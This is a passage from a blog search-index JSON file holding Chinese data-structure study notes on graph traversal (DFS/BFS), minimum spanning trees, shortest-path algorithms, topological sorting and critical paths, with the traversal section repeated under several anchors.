NextAdjVex(G, u, w)) if(!visited[w]){ //w为u的尚未访问的邻接顶点 cout\u003c\u003cw; visited[w] = true; EnQueue(Q, w); //w进队 }//if }//while }//BFS 效率分析用邻接矩阵，则BFS对于每一个被访问到的顶点，都要循环检测矩阵中的整整一行（n个元素），总的时间代价为O(n^2)。 用邻接表，虽然有2e个表结点，但只需要扫描e个结点即可完成遍历，加上访问n个头结点的时间，时间复杂度为O(n+e)。 DFS与BFS算法效率比较空间复杂度相同，都是O(n)（借用了堆栈或队列）； 时间复杂度只与存储结构（邻接矩阵或邻接表）有关，而与搜索路径无关。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#图的遍历"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#遍历定义"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#深度优先遍历dfs"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#效率分析"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#非连通图的遍历"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#广度优先遍历bfs"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#非递归遍历连通图"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#效率分析-1"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c","date":"2023-12-19","objectID":"/data_structure_notes/:6:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#dfs与bfs算法效率比较"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧\u003cvi,vj\u003e，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 \u003ci,j\u003e存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#图的应用"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#最小生成树"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 